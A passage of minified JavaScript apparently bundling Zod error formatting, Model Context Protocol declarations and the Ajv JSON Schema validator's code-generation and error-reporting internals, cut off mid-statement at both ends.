${Y.divisor}`;case"unrecognized_keys":return`Unrecognized key${Y.keys.length>1?"s":""}: ${sU(Y.keys,", ")}`;case"invalid_key":return`Invalid key in ${Y.origin}`;case"invalid_union":return"Invalid input";case"invalid_element":return`Invalid value in ${Y.origin}`;default:return"Invalid input"}}},bU0,vU0,HW,iw,rw,aw,sw,ew,QI=(X,Q)=>{Ew.init(X,Q),X.name="ZodError",Object.defineProperties(X,{format:{value:(J)=>fd1(X,J)},flatten:{value:(J)=>xd1(X,J)},addIssue:{value:(J)=>X.issues.push(J)},addIssues:{value:(J)=>X.issues.push(...J)},isEmpty:{get(){return X.issues.length===0}}})},xU0,bW,jn1,Fn1,On1,An1,l0,JI,Rn1,p0,Ln1,hN,$W,Dn1,Nn1,wn1,In1,Cn1,Pn1,Sn1,En1,Tn1,_n1,kn1,bn1,vn1,xn1,fn1,hn1,YI,yn1,gn1,mn1,un1,cn1,pn1,GI,HI,dn1,in1,rn1,eU,nn1,an1,UI,on1,sn1,en1,KI,Ja1,Wa1,Ga1,VI,qK="io.modelcontextprotocol/related-task",vW="2.0",G8,qI,ZI,Va1,ZK,Ba1,d9,q9,M7,V6,N9,xW,qa1,Za1,Ma1,mN,ja1,fU0,MI,Fa1,jI,Oa1,gQ,h5,FI,Aa1,Ra1,La1,Da1,Na1,wa1,Ia1,Ca1,Pa1,Sa1,OI,Ea1,Ta1,AI,_a1,mQ,uQ,cQ,RI,ka1,LI,DI,NI,wI,II,CI,hU0,yU0,PI,SI,MK,EI,c5,TI,ba1,va1,xa1,fa1,ha1,jK,ya1,ga1,ma1,ua1,ca1,la1,pa1,da1,ia1,ra1,na1,aa1,oa1,sa1,ta1,ea1,FK,OK,AK,Xo1,Qo1,Jo1,RK,Yo1,Wo1,Go1,Ho1,$o1,_I,zo1,Uo1,kI,gU0,Ko1,Vo1,Bo1,bI,qo1,Zo1,Mo1,jo1,Fo1,Oo1,Ao1,Ro1,Lo1,RW,Do1,No1,wo1,Io1,Co1,Po1,So1,Eo1,To1,_o1,ko1,bo1,vo1,xo1,fo1,ho1,yo1,go1,mo1,uo1,co1,lo1,po1,do1,io1,ro1,no1,ao1,oo1,so1,to1,eo1,Xs1,mU0,uU0,cU0,lU0,pU0,dU0,iU0,rU0,nU0,aU0,uN;var vI=$1(()=>{Au1=Object.create,Ru1=Object.getPrototypeOf,dU=Object.defineProperty,Lu1=Object.getOwnPropertyNames,Du1=Object.prototype.hasOwnProperty,zW=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.regexpCode=X.getEsmExportName=X.getProperty=X.safeStringify=X.stringify=X.strConcat=X.addCodeArg=X.str=X._=X.nil=X._Code=X.Name=X.IDENTIFIER=X._CodeOrName=void 0;class Q{}X._CodeOrName=Q,X.IDENTIFIER=/^[a-z$_][a-z$_0-9]*$/i;class J extends Q{constructor(j){super();if(!X.IDENTIFIER.test(j))throw Error("CodeGen: name must be a valid identifier");this.str=j}toString(){return this.str}emptyStr(){return!1}get names(){return{[this.str]:1}}}X.Name=J;class Y extends Q{constructor(j){super();this._items=typeof j==="string"?[j]:j}toString(){return this.str}emptyStr(){if(this._items.length>1)return!1;let j=this._items[0];return j===""||j==='""'}get str(){var j;return(j=this._str)!==null&&j!==void 0?j:this._str=this._items.reduce((F,A)=>`${F}${A}`,"")}get names(){var j;return(j=this._names)!==null&&j!==void 0?j:this._names=this._items.reduce((F,A)=>{if(A instanceof J)F[A.str]=(F[A.str]||0)+1;return F},{})}}X._Code=Y,X.nil=new Y("");function W(j,...F){let A=[j[0]],O=0;while(O<F.length)$(A,F[O]),A.push(j[++O]);return new Y(A)}X._=W;var G=new Y("+");function H(j,...F){let A=[Z(j[0])],O=0;while(O<F.length)A.push(G),$(A,F[O]),A.push(G,Z(j[++O]));return z(A),new Y(A)}X.str=H;function $(j,F){if(F instanceof Y)j.push(...F._items);else if(F instanceof J)j.push(F);else j.push(B(F))}X.addCodeArg=$;function z(j){let F=1;while(F<j.length-1){if(j[F]===G){let A=U(j[F-1],j[F+1]);if(A!==void 0){j.splice(F-1,3,A);continue}j[F++]="+"}F++}}function U(j,F){if(F==='""')return j;if(j==='""')return F;if(typeof j=="string"){if(F instanceof J||j[j.length-1]!=='"')return;if(typeof F!="string")return`${j.slice(0,-1)}${F}"`;if(F[0]==='"')return j.slice(0,-1)+F.slice(1);return}if(typeof F=="string"&&F[0]==='"'&&!(j instanceof J))return`"${j}${F.slice(1)}`;return}function K(j,F){return F.emptyStr()?j:j.emptyStr()?F:H`${j}${F}`}X.strConcat=K;function B(j){return typeof j=="number"||typeof j=="boolean"||j===null?j:Z(Array.isArray(j)?j.join(","):j)}function q(j){return new Y(Z(j))}X.stringify=q;function Z(j){return JSON.stringify(j).replace(/\u2028/g,"\\u2028").replace(/\u2029/g,"\\u2029")}X.safeStringify=Z;function M(j){return typeof j=="string"&&X.IDENTIFIER.test(j)?new Y(`.${j}`):W`[${j}]`}X.getProperty=M;function L(j){if(typeof j=="string"&&X.IDENTIFIER.test(j))return new Y(`${j}`);throw Error(`CodeGen: invalid export name: ${j}, use explicit $id name mapping`)}X.getEsmExportName=L;function R(j){return new Y(j.toString())}X.regexpCode=R}),zN=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.ValueScope=X.ValueScopeName=X.Scope=X.varKinds=X.UsedValueState=void 0;var Q=zW();class J extends Error{constructor(z){super(`CodeGen: "code" for ${z} not defined`);this.value=z.value}}var Y;(function(z){z[z.Started=0]="Started",z[z.Completed=1]="Completed"})(Y||(X.UsedValueState=Y={})),X.varKinds={const:new Q.Name("const"),let:new Q.Name("let"),var:new Q.Name("var")};class W{constructor({prefixes:z,parent:U}={}){this._names={},this._prefixes=z,this._parent=U}toName(z){return z instanceof Q.Name?z:this.name(z)}name(z){return new Q.Name(this._newName(z))}_newName(z){let U=this._names[z]||this._nameGroup(z);return`${z}${U.index++}`}_nameGroup(z){var U,K;if(((K=(U=this._parent)===null||U===void 0?void 0:U._prefixes)===null||K===void 0?void 0:K.has(z))||this._prefixes&&!this._prefixes.has(z))throw Error(`CodeGen: prefix "${z}" is not allowed in this scope`);return this._names[z]={prefix:z,index:0}}}X.Scope=W;class G extends Q.Name{constructor(z,U){super(U);this.prefix=z}setValue(z,{property:U,itemIndex:K}){this.value=z,this.scopePath=Q._`.${new Q.Name(U)}[${K}]`}}X.ValueScopeName=G;var H=Q._`\n`;class $ extends W{constructor(z){super(z);this._values={},this._scope=z.scope,this.opts={...z,_n:z.lines?H:Q.nil}}get(){return this._scope}name(z){return new G(z,this._newName(z))}value(z,U){var K;if(U.ref===void 0)throw Error("CodeGen: ref must be passed in value");let B=this.toName(z),{prefix:q}=B,Z=(K=U.key)!==null&&K!==void 0?K:U.ref,M=this._values[q];if(M){let j=M.get(Z);if(j)return j}else M=this._values[q]=new Map;M.set(Z,B);let L=this._scope[q]||(this._scope[q]=[]),R=L.length;return L[R]=U.ref,B.setValue(U,{property:q,itemIndex:R}),B}getValue(z,U){let K=this._values[z];if(!K)return;return K.get(U)}scopeRefs(z,U=this._values){return this._reduceValues(U,(K)=>{if(K.scopePath===void 0)throw Error(`CodeGen: name "${K}" has no value`);return Q._`${z}${K.scopePath}`})}scopeCode(z=this._values,U,K){return this._reduceValues(z,(B)=>{if(B.value===void 0)throw Error(`CodeGen: name "${B}" has no value`);return B.value.code},U,K)}_reduceValues(z,U,K={},B){let q=Q.nil;for(let Z in z){let M=z[Z];if(!M)continue;let L=K[Z]=K[Z]||new Map;M.forEach((R)=>{if(L.has(R))return;L.set(R,Y.Started);let j=U(R);if(j){let F=this.opts.es5?X.varKinds.var:X.varKinds.const;q=Q._`${q}${F} ${R} = ${j};${this.opts._n}`}else if(j=B===null||B===void 0?void 0:B(R))q=Q._`${q}${j}${this.opts._n}`;else throw new J(R);L.set(R,Y.Completed)})}return q}}X.ValueScope=$}),V0=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.or=X.and=X.not=X.CodeGen=X.operators=X.varKinds=X.ValueScopeName=X.ValueScope=X.Scope=X.Name=X.regexpCode=X.stringify=X.getProperty=X.nil=X.strConcat=X.str=X._=void 0;var Q=zW(),J=zN(),Y=zW();Object.defineProperty(X,"_",{enumerable:!0,get:function(){return Y._}}),Object.defineProperty(X,"str",{enumerable:!0,get:function(){return Y.str}}),Object.defineProperty(X,"strConcat",{enumerable:!0,get:function(){return Y.strConcat}}),Object.defineProperty(X,"nil",{enumerable:!0,get:function(){return Y.nil}}),Object.defineProperty(X,"getProperty",{enumerable:!0,get:function(){return Y.getProperty}}),Object.defineProperty(X,"stringify",{enumerable:!0,get:function(){return Y.stringify}}),Object.defineProperty(X,"regexpCode",{enumerable:!0,get:function(){return Y.regexpCode}}),Object.defineProperty(X,"Name",{enumerable:!0,get:function(){return Y.Name}});var W=zN();Object.defineProperty(X,"Scope",{enumerable:!0,get:function(){return W.Scope}}),Object.defineProperty(X,"ValueScope",{enumerable:!0,get:function(){return W.ValueScope}}),Object.defineProperty(X,"ValueScopeName",{enumerable:!0,get:function(){return W.ValueScopeName}}),Object.defineProperty(X,"varKinds",{enumerable:!0,get:function(){return W.varKinds}}),X.operators={GT:new Q._Code(">"),GTE:new Q._Code(">="),LT:new Q._Code("<"),LTE:new Q._Code("<="),EQ:new Q._Code("==="),NEQ:new Q._Code("!=="),NOT:new Q._Code("!"),OR:new Q._Code("||"),AND:new Q._Code("&&"),ADD:new Q._Code("+")};class G{optimizeNodes(){return this}optimizeNames(I,v){return this}}class H extends G{constructor(I,v,g){super();this.varKind=I,this.name=v,this.rhs=g}render({es5:I,_n:v}){let g=I?J.varKinds.var:this.varKind,H1=this.rhs===void 0?"":` = ${this.rhs}`;return`${g} ${this.name}${H1};`+v}optimizeNames(I,v){if(!I[this.name.str])return;if(this.rhs)this.rhs=Q1(this.rhs,I,v);return this}get names(){return this.rhs instanceof Q._CodeOrName?this.rhs.names:{}}}class $ extends G{constructor(I,v,g){super();this.lhs=I,this.rhs=v,this.sideEffects=g}render({_n:I}){return`${this.lhs} = ${this.rhs};`+I}optimizeNames(I,v){if(this.lhs instanceof Q.Name&&!I[this.lhs.str]&&!this.sideEffects)return;return this.rhs=Q1(this.rhs,I,v),this}get names(){let I=this.lhs instanceof Q.Name?{}:{...this.lhs.names};return d(I,this.rhs)}}class z extends ${constructor(I,v,g,H1){super(I,g,H1);this.op=v}render({_n:I}){return`${this.lhs} ${this.op}= ${this.rhs};`+I}}class U extends G{constructor(I){super();this.label=I,this.names={}}render({_n:I}){return`${this.label}:`+I}}class K extends G{constructor(I){super();this.label=I,this.names={}}render({_n:I}){return`break${this.label?` ${this.label}`:""};`+I}}class B extends G{constructor(I){super();this.error=I}render({_n:I}){return`throw ${this.error};`+I}get names(){return this.error.names}}class q extends G{constructor(I){super();this.code=I}render({_n:I}){return`${this.code};`+I}optimizeNodes(){return`${this.code}`?this:void 0}optimizeNames(I,v){return this.code=Q1(this.code,I,v),this}get names(){return this.code instanceof Q._CodeOrName?this.code.names:{}}}class Z extends G{constructor(I=[]){super();this.nodes=I}render(I){return this.nodes.reduce((v,g)=>v+g.render(I),"")}optimizeNodes(){let{nodes:I}=this,v=I.length;while(v--){let g=I[v].optimizeNodes();if(Array.isArray(g))I.splice(v,1,...g);else if(g)I[v]=g;else I.splice(v,1)}return I.length>0?this:void 0}optimizeNames(I,v){let{nodes:g}=this,H1=g.length;while(H1--){let z1=g[H1];if(z1.optimizeNames(I,v))continue;V1(I,z1.names),g.splice(H1,1)}return g.length>0?this:void 0}get names(){return this.nodes.reduce((I,v)=>e(I,v.names),{})}}class M extends Z{render(I){return"{"+I._n+super.render(I)+"}"+I._n}}class L extends Z{}class R extends M{}R.kind="else";class j extends M{constructor(I,v){super(v);this.condition=I}render(I){let v=`if(${this.condition})`+super.render(I);if(this.else)v+="else "+this.else.render(I);return v}optimizeNodes(){super.optimizeNodes();let I=this.condition;if(I===!0)return this.nodes;let v=this.else;if(v){let g=v.optimizeNodes();v=this.else=Array.isArray(g)?new R(g):g}if(v){if(I===!1)return v instanceof j?v:v.nodes;if(this.nodes.length)return this;return new j(D1(I),v instanceof j?[v]:v.nodes)}if(I===!1||!this.nodes.length)return;return this}optimizeNames(I,v){var g;if(this.else=(g=this.else)===null||g===void 0?void 0:g.optimizeNames(I,v),!(super.optimizeNames(I,v)||this.else))return;return this.condition=Q1(this.condition,I,v),this}get names(){let I=super.names;if(d(I,this.condition),this.else)e(I,this.else.names);return I}}j.kind="if";class F extends M{}F.kind="for";class A extends F{constructor(I){super();this.iteration=I}render(I){return`for(${this.iteration})`+super.render(I)}optimizeNames(I,v){if(!super.optimizeNames(I,v))return;return this.iteration=Q1(this.iteration,I,v),this}get names(){return e(super.names,this.iteration.names)}}class O extends F{constructor(I,v,g,H1){super();this.varKind=I,this.name=v,this.from=g,this.to=H1}render(I){let v=I.es5?J.varKinds.var:this.varKind,{name:g,from:H1,to:z1}=this;return`for(${v} ${g}=${H1}; ${g}<${z1}; ${g}++)`+super.render(I)}get names(){let I=d(super.names,this.from);return d(I,this.to)}}class w extends F{constructor(I,v,g,H1){super();this.loop=I,this.varKind=v,this.name=g,this.iterable=H1}render(I){return`for(${this.varKind} ${this.name} ${this.loop} ${this.iterable})`+super.render(I)}optimizeNames(I,v){if(!super.optimizeNames(I,v))return;return this.iterable=Q1(this.iterable,I,v),this}get names(){return e(super.names,this.iterable.names)}}class N extends M{constructor(I,v,g){super();this.name=I,this.args=v,this.async=g}render(I){return`${this.async?"async ":""}function ${this.name}(${this.args})`+super.render(I)}}N.kind="func";class C extends Z{render(I){return"return "+super.render(I)}}C.kind="return";class _ extends M{render(I){let v="try"+super.render(I);if(this.catch)v+=this.catch.render(I);if(this.finally)v+=this.finally.render(I);return v}optimizeNodes(){var I,v;return super.optimizeNodes(),(I=this.catch)===null||I===void 0||I.optimizeNodes(),(v=this.finally)===null||v===void 0||v.optimizeNodes(),this}optimizeNames(I,v){var g,H1;return super.optimizeNames(I,v),(g=this.catch)===null||g===void 0||g.optimizeNames(I,v),(H1=this.finally)===null||H1===void 0||H1.optimizeNames(I,v),this}get names(){let I=super.names;if(this.catch)e(I,this.catch.names);if(this.finally)e(I,this.finally.names);return I}}class h extends M{constructor(I){super();this.error=I}render(I){return`catch(${this.error})`+super.render(I)}}h.kind="catch";class o extends M{render(I){return"finally"+super.render(I)}}o.kind="finally";class p{constructor(I,v={}){this._values={},this._blockStarts=[],this._constants={},this.opts={...v,_n:v.lines?`
`:""},this._extScope=I,this._scope=new J.Scope({parent:I}),this._nodes=[new L]}toString(){return this._root.render(this.opts)}name(I){return this._scope.name(I)}scopeName(I){return this._extScope.name(I)}scopeValue(I,v){let g=this._extScope.value(I,v);return(this._values[g.prefix]||(this._values[g.prefix]=new Set)).add(g),g}getScopeValue(I,v){return this._extScope.getValue(I,v)}scopeRefs(I){return this._extScope.scopeRefs(I,this._values)}scopeCode(){return this._extScope.scopeCode(this._values)}_def(I,v,g,H1){let z1=this._scope.toName(v);if(g!==void 0&&H1)this._constants[z1.str]=g;return this._leafNode(new H(I,z1,g)),z1}const(I,v,g){return this._def(J.varKinds.const,I,v,g)}let(I,v,g){return this._def(J.varKinds.let,I,v,g)}var(I,v,g){return this._def(J.varKinds.var,I,v,g)}assign(I,v,g){return this._leafNode(new $(I,v,g))}add(I,v){return this._leafNode(new z(I,X.operators.ADD,v))}code(I){if(typeof I=="function")I();else if(I!==Q.nil)this._leafNode(new q(I));return this}object(...I){let v=["{"];for(let[g,H1]of I){if(v.length>1)v.push(",");if(v.push(g),g!==H1||this.opts.es5)v.push(":"),(0,Q.addCodeArg)(v,H1)}return v.push("}"),new Q._Code(v)}if(I,v,g){if(this._blockNode(new j(I)),v&&g)this.code(v).else().code(g).endIf();else if(v)this.code(v).endIf();else if(g)throw Error('CodeGen: "else" body without "then" body');return this}elseIf(I){return this._elseNode(new j(I))}else(){return this._elseNode(new R)}endIf(){return this._endBlockNode(j,R)}_for(I,v){if(this._blockNode(I),v)this.code(v).endFor();return this}for(I,v){return this._for(new A(I),v)}forRange(I,v,g,H1,z1=this.opts.es5?J.varKinds.var:J.varKinds.let){let P1=this._scope.toName(I);return this._for(new O(z1,P1,v,g),()=>H1(P1))}forOf(I,v,g,H1=J.varKinds.const){let z1=this._scope.toName(I);if(this.opts.es5){let P1=v instanceof Q.Name?v:this.var("_arr",v);return this.forRange("_i",0,Q._`${P1}.length`,(j1)=>{this.var(z1,Q._`${P1}[${j1}]`),g(z1)})}return this._for(new w("of",H1,z1,v),()=>g(z1))}forIn(I,v,g,H1=this.opts.es5?J.varKinds.var:J.varKinds.const){if(this.opts.ownProperties)return this.forOf(I,Q._`Object.keys(${v})`,g);let z1=this._scope.toName(I);return this._for(new w("in",H1,z1,v),()=>g(z1))}endFor(){return this._endBlockNode(F)}label(I){return this._leafNode(new U(I))}break(I){return this._leafNode(new K(I))}return(I){let v=new C;if(this._blockNode(v),this.code(I),v.nodes.length!==1)throw Error('CodeGen: "return" should have one node');return this._endBlockNode(C)}try(I,v,g){if(!v&&!g)throw Error('CodeGen: "try" without "catch" and "finally"');let H1=new _;if(this._blockNode(H1),this.code(I),v){let z1=this.name("e");this._currNode=H1.catch=new h(z1),v(z1)}if(g)this._currNode=H1.finally=new o,this.code(g);return this._endBlockNode(h,o)}throw(I){return this._leafNode(new B(I))}block(I,v){if(this._blockStarts.push(this._nodes.length),I)this.code(I).endBlock(v);return this}endBlock(I){let v=this._blockStarts.pop();if(v===void 0)throw Error("CodeGen: not in self-balancing block");let g=this._nodes.length-v;if(g<0||I!==void 0&&g!==I)throw Error(`CodeGen: wrong number of nodes: ${g} vs ${I} expected`);return this._nodes.length=v,this}func(I,v=Q.nil,g,H1){if(this._blockNode(new N(I,v,g)),H1)this.code(H1).endFunc();return this}endFunc(){return this._endBlockNode(N)}optimize(I=1){while(I-- >0)this._root.optimizeNodes(),this._root.optimizeNames(this._root.names,this._constants)}_leafNode(I){return this._currNode.nodes.push(I),this}_blockNode(I){this._currNode.nodes.push(I),this._nodes.push(I)}_endBlockNode(I,v){let g=this._currNode;if(g instanceof I||v&&g instanceof v)return this._nodes.pop(),this;throw Error(`CodeGen: not in block "${v?`${I.kind}/${v.kind}`:I.kind}"`)}_elseNode(I){let v=this._currNode;if(!(v instanceof j))throw Error('CodeGen: "else" without "if"');return this._currNode=v.else=I,this}get _root(){return this._nodes[0]}get _currNode(){let I=this._nodes;return I[I.length-1]}set _currNode(I){let v=this._nodes;v[v.length-1]=I}}X.CodeGen=p;function e(I,v){for(let g in v)I[g]=(I[g]||0)+(v[g]||0);return I}function d(I,v){return v instanceof Q._CodeOrName?e(I,v.names):I}function Q1(I,v,g){if(I instanceof Q.Name)return H1(I);if(!z1(I))return I;return new Q._Code(I._items.reduce((P1,j1)=>{if(j1 instanceof Q.Name)j1=H1(j1);if(j1 instanceof Q._Code)P1.push(...j1._items);else P1.push(j1);return P1},[]));function H1(P1){let j1=g[P1.str];if(j1===void 0||v[P1.str]!==1)return P1;return delete v[P1.str],j1}function z1(P1){return P1 instanceof Q._Code&&P1._items.some((j1)=>j1 instanceof Q.Name&&v[j1.str]===1&&g[j1.str]!==void 0)}}function V1(I,v){for(let g in v)I[g]=(I[g]||0)-(v[g]||0)}function D1(I){return typeof I=="boolean"||typeof I=="number"||I===null?!I:Q._`!${a(I)}`}X.not=D1;var n=y(X.operators.AND);function t(...I){return I.reduce(n)}X.and=t;var u=y(X.operators.OR);function E(...I){return I.reduce(u)}X.or=E;function y(I){return(v,g)=>v===Q.nil?g:g===Q.nil?v:Q._`${a(v)} ${I} ${a(g)}`}function a(I){return I instanceof Q.Name?I:Q._`(${I})`}}),D0=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.checkStrictMode=X.getErrorPath=X.Type=X.useFunc=X.setEvaluated=X.evaluatedPropsToName=X.mergeEvaluated=X.eachItem=X.unescapeJsonPointer=X.escapeJsonPointer=X.escapeFragment=X.unescapeFragment=X.schemaRefOrVal=X.schemaHasRulesButRef=X.schemaHasRules=X.checkUnknownRules=X.alwaysValidSchema=X.toHash=void 0;var Q=V0(),J=zW();function Y(N){let C={};for(let _ of N)C[_]=!0;return C}X.toHash=Y;function W(N,C){if(typeof C=="boolean")return C;if(Object.keys(C).length===0)return!0;return G(N,C),!H(C,N.self.RULES.all)}X.alwaysValidSchema=W;function G(N,C=N.schema){let{opts:_,self:h}=N;if(!_.strictSchema)return;if(typeof C==="boolean")return;let o=h.RULES.keywords;for(let p in C)if(!o[p])w(N,`unknown keyword: "${p}"`)}X.checkUnknownRules=G;function H(N,C){if(typeof N=="boolean")return!N;for(let _ in N)if(C[_])return!0;return!1}X.schemaHasRules=H;function $(N,C){if(typeof N=="boolean")return!N;for(let _ in N)if(_!=="$ref"&&C.all[_])return!0;return!1}X.schemaHasRulesButRef=$;function z({topSchemaRef:N,schemaPath:C},_,h,o){if(!o){if(typeof _=="number"||typeof _=="boolean")return _;if(typeof _=="string")return Q._`${_}`}return Q._`${N}${C}${(0,Q.getProperty)(h)}`}X.schemaRefOrVal=z;function U(N){return q(decodeURIComponent(N))}X.unescapeFragment=U;function K(N){return encodeURIComponent(B(N))}X.escapeFragment=K;function B(N){if(typeof N=="number")return`${N}`;return N.replace(/~/g,"~0").replace(/\//g,"~1")}X.escapeJsonPointer=B;function q(N){return N.replace(/~1/g,"/").replace(/~0/g,"~")}X.unescapeJsonPointer=q;function Z(N,C){if(Array.isArray(N))for(let _ of N)C(_);else C(N)}X.eachItem=Z;function M({mergeNames:N,mergeToName:C,mergeValues:_,resultToName:h}){return(o,p,e,d)=>{let Q1=e===void 0?p:e instanceof Q.Name?(p instanceof Q.Name?N(o,p,e):C(o,p,e),e):p instanceof Q.Name?(C(o,e,p),p):_(p,e);return d===Q.Name&&!(Q1 instanceof Q.Name)?h(o,Q1):Q1}}X.mergeEvaluated={props:M({mergeNames:(N,C,_)=>N.if(Q._`${_} !== true && ${C} !== undefined`,()=>{N.if(Q._`${C} === true`,()=>N.assign(_,!0),()=>N.assign(_,Q._`${_} || {}`).code(Q._`Object.assign(${_}, ${C})`))}),mergeToName:(N,C,_)=>N.if(Q._`${_} !== true`,()=>{if(C===!0)N.assign(_,!0);else N.assign(_,Q._`${_} || {}`),R(N,_,C)}),mergeValues:(N,C)=>N===!0?!0:{...N,...C},resultToName:L}),items:M({mergeNames:(N,C,_)=>N.if(Q._`${_} !== true && ${C} !== undefined`,()=>N.assign(_,Q._`${C} === true ? true : ${_} > ${C} ? ${_} : ${C}`)),mergeToName:(N,C,_)=>N.if(Q._`${_} !== true`,()=>N.assign(_,C===!0?!0:Q._`${_} > ${C} ? ${_} : ${C}`)),mergeValues:(N,C)=>N===!0?!0:Math.max(N,C),resultToName:(N,C)=>N.var("items",C)})};function L(N,C){if(C===!0)return N.var("props",!0);let _=N.var("props",Q._`{}`);if(C!==void 0)R(N,_,C);return _}X.evaluatedPropsToName=L;function R(N,C,_){Object.keys(_).forEach((h)=>N.assign(Q._`${C}${(0,Q.getProperty)(h)}`,!0))}X.setEvaluated=R;var j={};function F(N,C){return N.scopeValue("func",{ref:C,code:j[C.code]||(j[C.code]=new J._Code(C.code))})}X.useFunc=F;var A;(function(N){N[N.Num=0]="Num",N[N.Str=1]="Str"})(A||(X.Type=A={}));function O(N,C,_){if(N instanceof Q.Name){let h=C===A.Num;return _?h?Q._`"[" + ${N} + "]"`:Q._`"['" + ${N} + "']"`:h?Q._`"/" + ${N}`:Q._`"/" + ${N}.replace(/~/g, "~0").replace(/\\//g, "~1")`}return _?(0,Q.getProperty)(N).toString():"/"+B(N)}X.getErrorPath=O;function w(N,C,_=N.opts.strictSchema){if(!_)return;if(C=`strict mode: ${C}`,_===!0)throw Error(C);N.self.logger.warn(C)}X.checkStrictMode=w}),IX=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J={data:new Q.Name("data"),valCxt:new Q.Name("valCxt"),instancePath:new Q.Name("instancePath"),parentData:new Q.Name("parentData"),parentDataProperty:new Q.Name("parentDataProperty"),rootData:new Q.Name("rootData"),dynamicAnchors:new Q.Name("dynamicAnchors"),vErrors:new Q.Name("vErrors"),errors:new Q.Name("errors"),this:new Q.Name("this"),self:new Q.Name("self"),scope:new Q.Name("scope"),json:new Q.Name("json"),jsonPos:new Q.Name("jsonPos"),jsonLen:new Q.Name("jsonLen"),jsonPart:new Q.Name("jsonPart")};X.default=J}),LW=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.extendErrors=X.resetErrorsCount=X.reportExtraError=X.reportError=X.keyword$DataError=X.keywordError=void 0;var Q=V0(),J=D0(),Y=IX();X.keywordError={message:({keyword:R})=>Q.str`must pass "${R}" keyword validation`},X.keyword$DataError={message:({keyword:R,schemaType:j})=>j?Q.str`"${R}" keyword must be ${j} ($data)`:Q.str`"${R}" keyword is invalid ($data)`};function W(R,j=X.keywordError,F,A){let{it:O}=R,{gen:w,compositeRule:N,allErrors:C}=O,_=B(R,j,F);if(A!==null&&A!==void 0?A:N||C)z(w,_);else U(O,Q._`[${_}]`)}X.reportError=W;function G(R,j=X.keywordError,F){let{it:A}=R,{gen:O,compositeRule:w,allErrors:N}=A,C=B(R,j,F);if(z(O,C),!(w||N))U(A,Y.default.vErrors)}X.reportExtraError=G;function H(R,j){R.assign(Y.default.errors,j),R.if(Q._`${Y.default.vErrors} !== null`,()=>R.if(j,()=>R.assign(Q._`${Y.default.vErrors}.length`,j),()=>R.assign(Y.default.vErrors,null)))}X.resetErrorsCount=H;function $({gen:R,keyword:j,schemaValue:F,data:A,errsCount:O,it:w}){if(O===void 0)throw Error("ajv implementation error");let N=R.name("err");R.forRange("i",O,Y.default.errors,(C)=>{if(R.const(N,Q._`${Y.default.vErrors}[${C}]`),R.if(Q._`${N}.instancePath === undefined`,()=>R.assign(Q._`${N}.instancePath`,(0,Q.strConcat)(Y.default.instancePath,w.errorPath))),R.assign(Q._`${N}.schemaPath`,Q.str`${w.errSchemaPath}/${j}`),w.opts.verbose)R.assign(Q._`${N}.schema`,F),R.assign(Q._`${N}.data`,A)})}X.extendErrors=$;function z(R,j){let F=R.const("err",j);R.if(Q._`${Y.default.vErrors} === null`,()=>R.assign(Y.default.vErrors,Q._`[${F}]`),Q._`${Y.default.vErrors}.push(${F})`),R.code(Q._`${Y.default.errors}++`)}function U(R,j){let{gen:F,validateName:A,schemaEnv:O}=R;if(O.$async)F.throw(Q._`new ${R.ValidationError}(${j})`);else F.assign(Q._`${A}.errors`,j),F.return(!1)}var K={keyword:new Q.Name("keyword"),schemaPath:new Q.Name("schemaPath"),params:new Q.Name("params"),propertyName:new Q.Name("propertyName"),message:new Q.Name("message"),schema:new Q.Name("schema"),parentSchema:new Q.Name("parentSchema")};function B(R,j,F){let{createErrors:A}=R.it;if(A===!1)return Q._`{}`;return q(R,j,F)}function q(R,j,F={}){let{gen:A,it:O}=R,w=[Z(O,F),M(R,F)];return L(R,j,w),A.object(...w)}function Z({errorPath:R},{instancePath:j}){let F=j?Q.str`${R}${(0,J.getErrorPath)(j,J.Type.Str)}`:R;return[Y.default.instancePath,(0,Q.strConcat)(Y.default.instancePath,F)]}function M({keyword:R,it:{errSchemaPath:j}},{schemaPath:F,parentSchema:A}){let O=A?j:Q.str`${j}/${R}`;if(F)O=Q.str`${O}${(0,J.getErrorPath)(F,J.Type.Str)}`;return[K.schemaPath,O]}function L(R,{params:j,message:F},A){let{keyword:O,data:w,schemaValue:N,it:C}=R,{opts:_,propertyName:h,topSchemaRef:o,schemaPath:p}=C;if(A.push([K.keyword,O],[K.params,typeof j=="function"?j(R):j||Q._`{}`]),_.messages)A.push([K.message,typeof F=="function"?F(R):F]);if(_.verbose)A.push([K.schema,N],[K.parentSchema,Q._`${o}${p}`],[Y.default.data,w]);if(h)A.push([K.propertyName,h])}}),Nu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.boolOrEmptySchema=X.topBoolOrEmptySchema=void 0;var Q=LW(),J=V0(),Y=IX(),W={message:"boolean schema is false"};function G(z){let{gen:U,schema:K,validateName:B}=z;if(K===!1)$(z,!1);else if(typeof K=="object"&&K.$async===!0)U.return(Y.default.data);else U.assign(J._`${B}.errors`,null),U.return(!0)}X.topBoolOrEmptySchema=G;function H(z,U){let{gen:K,schema:B}=z;if(B===!1)K.var(U,!1),$(z);else K.var(U,!0)}X.boolOrEmptySchema=H;function $(z,U){let{gen:K,data:B}=z,q={gen:K,keyword:"false schema",data:B,schema:!1,schemaCode:!1,schemaValue:!1,params:{},it:z};(0,Q.reportError)(q,W,void 0,U)}}),pN=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.getRules=X.isJSONType=void 0;var Q=["string","number","integer","boolean","null","object","array"],J=new Set(Q);function Y(G){return typeof G=="string"&&J.has(G)}X.isJSONType=Y;function W(){let G={number:{type:"number",rules:[]},string:{type:"string",rules:[]},array:{type:"array",rules:[]},object:{type:"object",rules:[]}};return{types:{...G,integer:!0,boolean:!0,null:!0},rules:[{rules:[]},G.number,G.string,G.array,G.object],post:{rules:[]},all:{},keywords:{}}}X.getRules=W}),dN=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.shouldUseRule=X.shouldUseGroup=X.schemaHasRulesForType=void 0;function Q({schema:W,self:G},H){let $=G.RULES.types[H];return $&&$!==!0&&J(W,$)}X.schemaHasRulesForType=Q;function J(W,G){return G.rules.some((H)=>Y(W,H))}X.shouldUseGroup=J;function Y(W,G){var H;return W[G.keyword]!==void 0||((H=G.definition.implements)===null||H===void 0?void 0:H.some(($)=>W[$]!==void 